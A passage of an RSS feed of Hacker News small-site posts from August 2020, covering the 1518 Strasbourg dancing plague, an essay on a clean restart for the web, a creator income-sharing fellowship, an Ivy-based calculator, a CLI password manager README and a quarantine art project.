<div><figure><img src="https://interestinghistoryforall.files.wordpress.com/2020/08/4260b-0vvttv-mc7mqbqq5w.jpg" alt=""><figcaption>The Dancing plague. Source-Wikipedia</figcaption></figure></div>



<p>People danced non stop in joy under the hot sun in the summer of 1518 in Strasbourg. Many believed that the city had sinned, and God had decided to punish them for their sins. The mystery of the dance party is still not known clearly, but it might contain traces of the troubled society of the 15th and 16th centuries.</p>



<h3><strong>The Start</strong>:</h3>



<figure><img src="https://interestinghistoryforall.files.wordpress.com/2020/08/e76cb-0fbsr4ey9waql_imj.jpg" alt=""><figcaption>The Dance.Source-Museumhack</figcaption></figure>



<p>In 1518 a woman by the name Frau Troffea was the first to start the dance mania. A group of people from the city soon joined her. The dance party took to new heights as the dancers fell in exhaustion, and many even died. The city administration pressed the service of medical personnel, and they were equally astonished by the strange phenomenon. The city administration employed musicians to cool down the situation with some light music, but it made things far worse. Some men argued that Frau Toffea started the dance as an excuse to escape from household chores, and other women joined her for the same.</p>



<div><figure><img src="https://cdn-images-1.medium.com/max/800/0*tMlKb3iNsxXEIGQj" alt=""><figcaption>St Vitus.Source-Wikipedia</figcaption></figure></div>



<p>As people after people fell, the city resorted to an act of holiness as any European city would do at this time. The city prayed for help to St Vitus, the patron of dance. There were talks that the town has sinned and God had punished them for the act. The city administration banned prostitution, alcohol, and even dance to cleanse themselves from sin. The dancers were taken to the church of St Vitus and were worn red shoes as a healing process. The dance phenomenon slowly watered down, and the city was back to normal.</p>



<h3><strong>Aftermath</strong>:</h3>



<div><figure><img src="https://interestinghistoryforall.files.wordpress.com/2020/08/7a42e-0l4g1ohsy_zorrvk4.jpg" alt=""><figcaption>People brought under control. Source-History.com</figcaption></figure></div>



<p>Similar incidents popped up in the city of Aachen and some towns in Swiss. Modern psychologists attribute the strange phenomenon to the pandemic that swept across Europe during this time. The great plague consumed one-third of the European population. The faith of people on the religion had fainted during this period. The paranoia caused by the pandemic created psychological stress on the people, and they vented it out by their dance to death. The truth is no one knows yet why people in Strasbourg danced to death. With humanity now facing a pandemic at the scale of the great plague, we should be careful about the psychological effects of it in humans.</p>







<p>Orginially published in <a href="https://medium.com/history-in-bytes/when-people-danced-to-death-5160d0a98c7d">https://medium.com/history-in-bytes/when-people-danced-to-death-5160d0a98c7d</a></p>
			
			
						</div><!-- .entry-content -->

	<!-- .entry-author -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://worldhistoryinchunks.com/2020/08/23/when-people-danced-to-death/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250261</guid>
            <pubDate>Sun, 23 Aug 2020 07:32:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Clean Start for the Web]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24250252">thread link</a>) | @scraplab
<br/>
August 23, 2020 | https://macwright.com/2020/08/22/clean-starts-for-the-web.html | <a href="https://web.archive.org/web/*/https://macwright.com/2020/08/22/clean-starts-for-the-web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The web is in need of some reinvention right now.</p><p>The web’s evolution over the last decade has mirrored the American economy. All of the essential indicators are going “up and to the right,” a steady stream of fundamental advances reassure use that there “is progress,” but the actual experience and effects for individuals stagnates or regresses.</p><p>The crisis affects platforms, creators, and consumers alike.</p><p><em>I’m going to try and dissect and diagnose this situation, a bit. You can skip forward if you just want to read my casual, unprofessional pitch for a reboot of the web. The idea is that we could choose a new lightweight markdown format to replace HTML &amp; CSS, split the web into documents and applications, and find performance, accessibility, and fun again.</em></p><details><summary>This post uses the pedantic definition of "the web"</summary>I've discussed attempts to reinvent the "Internet" a few times. Things like dat, IPFS, and arweave are all projects to reinvent an Internet, or a transport and data-sharing layer. The web is what lies on top of that, the HTML, CSS, URLs, JavaScript, browsing experience.</details><h3 id="the-platform-collapse">The platform collapse</h3><p>The platform side is what changed last week, when <a href="https://arstechnica.com/information-technology/2020/08/firefox-maker-mozilla-lays-off-250-workers-says-covid-19-lowered-revenue/">Mozilla laid off 250 employees</a> and indicated that it would affect Firefox development. Firefox wasn’t the #2 browser - that’s Safari, mainly because of the captive audience of iPhone and iPad users. But it was the most popular browser that people <em>chose</em> to use.</p><p><img alt="Chart of browser market share, with Chrome becoming the monopoly" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-chart-of-browser-market-share-with-chrome-becoming-the-monopoly.png"></p><p><em>Chart from <a href="https://gs.statcounter.com/browser-market-share#monthly-200901-202007">statcounter</a></em></p><p>The real winner is not just Chrome, but Chrome’s engine. One codebase, <a href="https://en.wikipedia.org/wiki/KHTML">KHTML</a>, split into <a href="https://en.wikipedia.org/wiki/WebKit">WebKit</a> (Safari), and <a href="https://en.wikipedia.org/wiki/Blink_(browser_engine)">Blink</a> (Chrome, Microsoft Edge, Opera, etc.)</p><p>This a textbook monoculture. In one sense, it’s a victory for collaboration because nobody’s ‘wasting time’ on competing implementations and web developers can expect the same features and bugs across different browsers. But in a deeper way, it threatens one of the basic principles of how the web has evolved.</p><h3 id="specs--implementations">Specs &amp; implementations</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.webp" type="image/webp"><img alt="Decline" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.jpg"></picture></p><p>The web has evolved through a combination of <em>specifications</em> and <em>implementations</em>. Organizations like the <a href="https://whatwg.org/">WHATWG</a>, <a href="https://www.w3.org/">W3C</a>, and <a href="https://www.ietf.org/">IETF</a> have been collaboration spaces for independent developers, corporations, and academics to discuss potential new features of the web. Then, browsers would test those ideas out in a variety of implementations.</p><p>This was an interesting structural piece: it reassured us all that it was <em>possible</em> to follow along, and that a multi-participant web was one of our goals. It was frustrating to pull up <a href="https://caniuse.com/">caniuse</a> and see blank spots, but the idea was that different browsers may take the lead in some areas, but everyone catches up eventually. Chrome was not always the first to jump on features, or the first to optimize.</p><p>It’s slower to collaborate than to work alone, but it was beneficial in some ways that we’ve lost now. Chrome has been moving extremely fast, adding new specifications and ideas at a startling rate, and it’s becoming one of the hardest pieces of software to replicate.</p><p>Mike Healy I think <a href="https://twitter.com/mike_hasarms/status/1296575224599556097">said it best</a>:</p><blockquote><p>Do you think the web has almost ‘priced itself out of the market’ in terms of complexity if only 1-2 organisations are capable of building rendering engines for it?</p></blockquote><p>Not only is it nearly impossible to build a new browser from scratch, once you have one the ongoing cost of keeping up with standards requires a full team of experts. Read Drew DeVault’s <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">Web browsers need to stop</a> for that point, and keep reading all of Drew’s stuff.</p><details><summary>What about Flow?</summary>Yep, there’s a <a href="https://www.ekioh.com/flow-browser/">browser called Flow</a>, which may exist and may support a full range of web standards. If it does exist, I’ll be very excited about it, but it has been teased for almost a year now without any concrete evidence, so it could equally be vaporware.</details><h3 id="the-problem-for-creators">The problem for creators</h3><p>The web has gotten much harder to develop for.</p><p>The web has had about 25 years to grow, few opportunities to shrink, and is now surrounded by an extremely short-sighted culture that is an outgrowth of economic and career short-termism. There are lots of <a href="https://frankchimero.com/blog/2018/everything-easy/">ways to do anything</a>, and some of the most popular ways of building applications on the web are - in my opinion - <a href="https://macwright.com/2020/05/10/spa-fatigue.html">usually ghoulish overkill</a>.</p><p>The best way for folks to enter <em>web development</em> in 2020 is to choose a niche, like <a href="https://vuejs.org/">Vue.js</a> or <a href="https://reactjs.org/">React</a>, and hope that there’s a CSS and accessibility expert on their team.</p><p>For folks who just want to create a web page, who don’t want to enter an industry, there’s a baffling array of techniques, but all the simplest, probably-best ones are stigmatized. It’s easier to stumble into building your resume in React with GraphQL than it is to type some HTML in Notepad.</p><h3 id="the-problem-for-consumers">The problem for consumers</h3><p>We hope that all this innovation is <em>for the user</em>, but often it isn’t. Modern websites seem to be as large, slow, and buggy as they’ve ever been. Our computers are <a href="https://macwright.com/2019/11/15/something-is-wrong-with-computers.html">barely getting faster</a> and our internet connection speeds are stagnating (don’t even <em>try</em> to mention 5G). Webpage <a href="https://www.pingdom.com/blog/webpages-are-getting-larger-every-year-and-heres-why-it-matters/">size growth</a> is outpacing it all.</p><p>The end result is that I no longer expect pages to be fast, even with <a href="https://github.com/gorhill/uBlock">uBlock</a> installed in Firefox and a good local <a href="https://sonic.net/">fiber internet provider</a>.</p><p>I don’t want to lay all of the blame at <em>those web developers</em>, though. Here’s a story from an old job that I find kind of funny. We were collecting some data from user interactions to answer simple questions like “do people click to upload or do they drag &amp; drop?” So we enabled <a href="https://segment.com/">Segment</a>, a tool that lets you add data-collection pipelines by including a single script. The problem, though, is that Segment offered a big page of on/off switches with hundreds of data providers &amp; ad-tech companies on it. And, sure, enough, some folks closer to the business side started <em>clicking all those buttons</em>.</p><p>See, the problem with ads and data tracking is that <em>you can</em>, and who is going to say no? (In that instance, I said no, and added a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> that would block new advertiser access at the page level.)</p><h2 id="recreating-simplicity">Recreating simplicity</h2><blockquote><p>You cannot get a simple system by adding simplicity to a complex system. - <a href="http://erlang.org/pipermail/erlang-questions/2012-March/065087.html">Richard O’Keefe</a></p></blockquote><p>Where do we go from here? Some of the smartest folks out there have been <a href="https://twitter.com/_developit/status/1296628134406692865">advocating for a major version revision</a> of the web.</p><p><em>I am in no way qualified to speculate on a whole new web from scratch, but the <a href="https://www.nytimes.com/2020/08/21/us/california-wildfires.html">air quality</a> is scary so I’m skipping my run and it’s Saturday morning so here we are.</em></p><p>How do we make the web fun, participatory, and good?</p><p>My first thought is that there are two webs:</p><h3 id="the-document-web">The document web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.webp" type="image/webp"><img alt="Illustration of web pages" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.jpg"></picture></p><p>There is the “document web”, like blogs, news, Wikipedia, Twitter, Facebook. This is basically the original vision of the web, as far as I can understand it (I was 2). Basically CSS, which we now think of as a way for designers to add brand identity and tweak pixel-perfect details, was instead mostly a way of making plain documents readable and letting the <em>readers</em> of those documents customize how they looked. This attribute actually <a href="https://twitter.com/autiomaa/status/1296755641164468224">survived for a while in Chrome, in the form of user stylesheets</a>, and <a href="https://davidwalsh.name/firefox-user-stylesheet">still works in Firefox</a>. Though it’s going to be a rough ride in the current web which has basically thrown away <a href="https://en.wikipedia.org/wiki/Semantic_HTML">semantic HTML</a> as an idea.</p><h3 id="the-application-web">The “application” web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.webp" type="image/webp"><img alt="Illustration of machines" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.jpg"></picture></p><p>Then there’s the “application web”. This started as <em>server</em> applications, built with things like <a href="https://www.djangoproject.com/">Django</a> and <a href="https://rubyonrails.org/">Ruby on Rails</a> and before them a variety of technologies that will live forever in corporations, like <a href="https://en.wikipedia.org/wiki/Jakarta_Servlet">Java Servlets</a>.</p><p><a href="https://backbonejs.org/">Backbone.js</a> demonstrated that a lot of these applications could be moved into the browser, and then <a href="https://reactjs.org/">React</a> and its many SPA-style competitors established a new order for the web – highly-interactive, quite complex, client-side applications.</p><h3 id="the-war-between-the-parts-of-the-web">The war between the parts of the web</h3><p>I posit that this dual-nature is part of what gives the web its magic. But it’s also a destructive force.</p><p>The magic is that a simple blog can be creative expression, can be beautifully interactive. This one isn’t, but I’m just saying - <a href="https://www.typewolf.com/site-of-the-day">it’s possible</a>.</p><p>The problem is that the “document web” is often plagued by application characteristics - it’s the JavaScript and animations and complexity that makes your average newspaper website an unmitigated disaster. Where document websites adopt application patterns they often accidentally sacrifice <a href="https://www.a11yproject.com/">accessibility</a>, performance, and <a href="https://en.wikipedia.org/wiki/Web_scraping">machine readability</a>.</p><p>And the “application web” is plagued by the document characteristics - interactive applications are going to great lengths to avoid most of the essential characteristics of HTML &amp; CSS and just use them as raw materials - avoiding writing any HTML directly at all, avoiding <a href="https://mxstbr.com/thoughts/css-in-js">writing any CSS directly at all</a>, avoiding <a href="https://www.react-spring.io/">default animation features</a>, replacing <a href="https://reactrouter.com/">page-based navigation with something that looks like it but works completely differently</a>. The application web uses <a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>, not HTML, and would like that in the browser itself, or <a href="https://svelte.dev/">Svelte</a>, instead of JavaScript, and would like that too.</p><p>When I read blog posts from ‘traditional web developers’ who are mad that HTML &amp; CSS aren’t enough anymore and that everything is complicated –&nbsp;I think this is largely that the application stack for building websites has replaced the document stack in a lot of places. Where we would use Jekyll or server-side rendering, we now use React or Vue.js. There are advantages to that, but for a lot of minimally-interactive websites, it’s throwing away decades worth of knowledge in exchange for certain performance perks that might not even matter.</p><p>The appeal of social networks is partly because they let us create <em>documents</em> without thinking about web technology, and they provide guarantees around performance, accessibility, and polish that otherwise would take up our time. You don’t have to think about whether your last Facebook post will load quickly on your friend’s phone or whether your Instagram post will be correctly cropped and resized in the timeline - those things are taken care of.</p><p>To some extent, this doesn’t <em>need</em> to be something that only social networks provide, though: standards like <a href="https://en.wikipedia.org/wiki/RSS">RSS</a> and services like <a href="https://www.instapaper.com/">Instapaper</a> show that pleasing formatting and distribution can be done at the <em>platform level</em> and be provided on top of existing vanilla websites.</p><details><summary>These are not absolutes.</summary>Yeah, I can hear it now: but these categories are not …</details></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2020/08/22/clean-starts-for-the-web.html">https://macwright.com/2020/08/22/clean-starts-for-the-web.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2020/08/22/clean-starts-for-the-web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250252</guid>
            <pubDate>Sun, 23 Aug 2020 07:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cooperative Capital – ISA for starting up]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250211">thread link</a>) | @theanirudh
<br/>
August 23, 2020 | https://www.cooperative-capital.com/fellowship | <a href="https://web.archive.org/web/*/https://www.cooperative-capital.com/fellowship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5f25c0fe05247268ef2ecdcf" id="sections">
  
    <section data-section-id="5f25c4f743d30f1d3aa8f517" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--small&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--narrow&quot;,
  &quot;sectionTheme&quot; : &quot;light-bold&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-type="page-section" id="page-section-5f25c4f743d30f1d3aa8f517"><div><div><div data-block-type="2" id="block-a615fc477cadcb172f72"><div><h3>Creator Fellowship</h3><p>It might be time to quit your day-job. Maybe you have a creative project to share with the world. Maybe you want to launch a business. Maybe you want to turn your writing into something more. Maybe you’re not quite sure yet. Whatever it is, the Creator Fellowship is a pretty simple way to take the leap:</p><ol data-rte-list="default"><li><p>We invest $20,000 in you</p></li><li><p>You quit your job &amp; create full-time</p></li><li><p>We help you build your personal monopoly</p></li><li><p>We share the upside as you grow</p></li><li><p>We invest in your future businesses</p></li></ol></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f25cae5ea3e2c6932de6e52" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--medium&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--wide&quot;,
  &quot;sectionTheme&quot; : &quot;bright&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-type="page-section" id="page-section-5f25cae5ea3e2c6932de6e52"><div><div><div><div><div data-block-type="2" id="block-20d5c017f12891263534"><div><h3>$20k to take the leap</h3><p>We know it’s hard to take the leap into your future online life. You have bills to pay and it’s daunting to head out on your own. We make it an easier decision by providing you the safety net to dive in and start creating full-time.</p></div></div></div><div><div data-block-type="2" id="block-b6eb91a7257f8fc03466"><div><h3>Support to get started </h3><p>Putting yourself out there on the internet is intimidating. Luckily, there’s an online course and community designed to help you do it authentically. In addition to the cash, we’ll hook you up with access to <a href="https://www.perell.com/write-of-passage">Write of Passage</a> to help you build your voice, content, and community online.</p></div></div></div><div><div data-block-type="2" id="block-680c475539669160bf19"><div><h3>Mentorship to grow</h3><p>Once you’re in the Creator Fellowship community, you have access to Cooperative Capital’s resources, coaching, mentors, and more. Whether you need help with content, digital marketing, growth, product development, or monetization, we can help you make it happen. </p></div></div></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f25cd27eb02ec7342f730a6" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--small&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--wide&quot;,
  &quot;sectionTheme&quot; : &quot;light-bold&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-type="page-section" id="page-section-5f25cd27eb02ec7342f730a6"><div><div><div data-block-type="2" id="block-cee73696c4d81a8cbec4"><div><h3>Sharing the upside </h3><p>The Fellowship program is an investment in you. We share in the upside in two ways: an income sharing agreement &amp; equity conversion rights. </p><p><strong>We win when you win.</strong> Our incentives are aligned with yours: we want to do everything we can to help you build a sustainable, independent career.</p><p><strong>We eat the downside risk.</strong> If for any reason you don’t reach your goals, we stay in touch, cheer you on in your future endeavors, and you go on your way completely debt-free. </p><p><strong>We build a long-term relationship. </strong>Life is a multi-player iterated game, and we want to invest not only in the you of today, but the future you as well. </p></div></div></div><div><div><div><div data-block-type="2" id="block-917bce581114b4de32e5"><div><h4>Income Sharing Agreement</h4><p>In exchange for our investment, you share 20% of your net earnings above $20,000 for 5 years, capped at 3x the initial investment. In other words:</p><ul data-rte-list="default"><li><p>The first $20,000 per year is all yours</p></li><li><p>Then you share 20% of your income</p></li><li><p>After 5 years or a 3x return on the initial investment, you’re off the hook — even if you haven’t paid back a penny</p></li></ul></div></div></div><div><div data-block-type="2" id="block-1549da5143b4d3b109a5"><div><h4>Equity Conversion</h4><p>We reserve the right to invest in your future businesses. </p><p>If you start a company during the five year period (which we will help you do if you want to!), we have the option to invest at a $1M capped valuation.</p></div></div></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f25d7c74ccb2332c332aa76" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--medium&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--narrow&quot;,
  &quot;customContentWidth&quot; : 40,
  &quot;sectionTheme&quot; : &quot;bright&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-type="page-section" id="page-section-5f25d7c74ccb2332c332aa76"><div><div><div data-block-type="2" id="block-a213afa322c038e04ea4"><div><h3>Apply now</h3><p>The application is short and our responses are quick. Please do not exceed the word count limits. </p></div></div></div></div></div>
    </div>
  </div>
</section>

  
</article>

          
          
          
        
      </div></div>]]>
            </description>
            <link>https://www.cooperative-capital.com/fellowship</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250211</guid>
            <pubDate>Sun, 23 Aug 2020 07:16:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Calculator Powered by Rob Pike's Ivy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250198">thread link</a>) | @danskeren
<br/>
August 23, 2020 | https://ask.moe/search?c=math&q= | <a href="https://web.archive.org/web/*/https://ask.moe/search?c=math&q=">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div component="category-math">
<p>Ask.Moe's calculator is powered by Rob Pike's Ivy, an interpreter for an APL-like language. Input values may be integers (3, -1), rationals (1/3, -45/67) or floating point values (1e3, -1.5 (representing 1000 and -3/2)).</p>
<p>Please be aware that operators always have the same precedence and expressions are evaluated in right-associative order. That is, unary operators apply to everything to the right, and binary operators apply to the operand immediately to the left and to everything to the right. Thus, 3*4+5 is 27 (it groups as 3*(4+5)) and iota 3+2 is 1 2 3 4 5 while 3+iota 2 is 4 5. A vector is a single operand, so 1 2 3 + 3 + 3 4 5 is (1 2 3) + 3 + (3 4 5), or 7 9 11. Arithmetic has the obvious operations: + - * etc. ** is exponentiation. mod is modulo.</p>
<p>Try the following examples:</p>
<ul>
<li><a href="https://ask.moe/search?c=math&amp;q=2*3%2B4">2*3+4</a>. Parsed as 2*(3+4), not the usual (2*3)+4.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=2**2%2B3">2**2+3</a>. Parsed as 2**5, not (2**2) + 3.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(2**2)%2B3">(2**2)+3</a>. Use parentheses if you need to group differently.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=3%2F1e10">3/1e10</a>. Not an integer, but an exact rational.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=2**6400">2**6400</a>. A really big integer.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(2**1e3)%2F(3**1e2)">(2**1e3)/(3**1e2)</a>. Rationals can be very big too.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=char+0x1f4a9">char 0x1f4a9</a>. Char is an operator: character with given value.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=1+2+3+%2B+4+5+6">1 2 3 + 4 5 6</a>. Arithmetic works elementwise on vectors.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(1+%3C%3C+1+2+3+4+5)+%3D%3D+(2+**+1+2+3+4+5)">(1 &lt;&lt; 1 2 3 4 5) == (2 ** 1 2 3 4 5)</a>. Note: true is 1, false is 0.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=pi%3B+e">pi; e</a>. pi and e are built-in, high-precision constants.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=sqrt+2">sqrt 2</a>. Ivy stores irrational results in high-precision (default 256-bit) floating point numbers.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=a%3D5%3B+a%3B+a*10">a=5; a; a*10</a>. Assign variables with the = operator, use semicolons to perform multiple operations.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=op+primes+N+%3D+(not+T+in+T+o.*+T)+sel+T+%3D+1+drop+iota+N%3B+primes+50">op primes N = (not T in T o.* T) sel T = 1 drop iota N; primes 50</a>. primes less than N (unary).</li>
<li><a href="https://ask.moe/search?c=math&amp;q=3+20+rho+1">3 20 rho 1</a>. Ivy allows multidimensional arrays. The binary shape operator, rho, builds them.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=5+5+rho+iota+25">5 5 rho iota 25</a>. Dimension (which may be a vector) on the left, data on the right.</li>
</ul>
<p>Check out <a href="https://godoc.org/robpike.io/ivy">Ivy's list of supported operations</a>. You can contribute to Ask.Moe's calculator by contributing to Ivy.</p>
</div>
</div></div>]]>
            </description>
            <link>https://ask.moe/search?c=math&amp;q=</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250198</guid>
            <pubDate>Sun, 23 Aug 2020 07:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Voidpass – A CLI password manager for stateful and stateless profiles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250097">thread link</a>) | @max0563
<br/>
August 22, 2020 | https://GitHub.com/f-prime/voidpass | <a href="https://web.archive.org/web/*/https://GitHub.com/f-prime/voidpass">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="readme">
    
      <div>
        <article itemprop="text">
<p>A flexible password manager for dealing with stateful and stateless password profiles.</p>
<p>voidpass has two main features:</p>
<ol>
<li>New passwords generated are stateless meaning that the password is never saved, encrypted or otherwise. Passwords can be generated on any machine running voidpass only requiring a website, username, and a master password.</li>
<li>Existing passwords are encrypted (AES SIC) and the ciphertext is saved. This allows existing passwords to be migrated over if desired.</li>
</ol>

<ul>
<li>Dart 2.7.1</li>
<li><a href="https://pub.dev/packages/encrypt" rel="nofollow">encrypt</a></li>
<li><a href="https://pub.dev/packages/crypto" rel="nofollow">crypto</a></li>
</ul>

<p><code>make build-cli</code></p>

<p><code>make test</code></p>

<pre><code>Usage: ./voidpass &lt;command&gt;

voidpass commands

generate - Generates a new password profile (does not save password)
add - Adds an existing password (encrypts password and saves to file)
delete - Remove a password profile
list - Lists metadata for all passwords
search - Searches through password profile file and returns relevent profile entries
retrieve - Retrieves profile entry and reveals password
help - Shows this menu
</code></pre>
</article>
      </div>
  </div></div>]]>
            </description>
            <link>https://GitHub.com/f-prime/voidpass</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250097</guid>
            <pubDate>Sun, 23 Aug 2020 06:44:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2020: An Isolation Odyssey]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250068">thread link</a>) | @unhammer
<br/>
August 22, 2020 | http://lydiacambron.com/index.php/project/2020-an-isolation-odyssey/ | <a href="https://web.archive.org/web/*/http://lydiacambron.com/index.php/project/2020-an-isolation-odyssey/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>2020: an isolation odyssey</em> is a reenactment of the iconic finale of <em>2001: A Space Odyssey</em> (Stanley Kubrick, 1968). Restaged in the context of home quarantine, the journey through time adapts to the mundane dramas of self-isolation–poking fun at the navel-gazing saga of life alone and indoors.</p>

<p>This project began in late March and was completed in late May, spanning the height of the pandemic in New York City. Staged in a one bedroom Brooklyn apartment, <em>2020</em> presents an obvious similarity to the domestic setting of <em>2001</em>. The stacked videos and synced movements also reveal parallels in emotion. The narrowness of daily life in a single space, transitioning from confusion to acceptance, a distorted sense of time, and ‘returning’ after a transformational event–all experiences analogous to quarantine. </p>

<p>The adapted version delineates the passing of time through wardrobe rather than age, identifying each phase of the character’s journey with a product of self care or PPE. Tools of private entertainment or self betterment are also used as props, questioning our confidence in products and productivity as anchors during times of uncertainty. Multitasking while #wfh, conjuring guilt or longing with unused exercise equipment, your entire being reduced to a measure of time–these scenes all illustrate the absurd comedy of trying to maintain control during this unprecedented and unpredictable time.<br>
</p></div></div>]]>
            </description>
            <link>http://lydiacambron.com/index.php/project/2020-an-isolation-odyssey/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250068</guid>
            <pubDate>Sun, 23 Aug 2020 06:37:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Polaris to rapidly build a ReactJs application]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24249967">thread link</a>) | @root993
<br/>
August 22, 2020 | https://www.sankalpjonna.com/posts/use-polaris-to-rapidly-build-a-reactjs-application | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/use-polaris-to-rapidly-build-a-reactjs-application">archive.org</a>
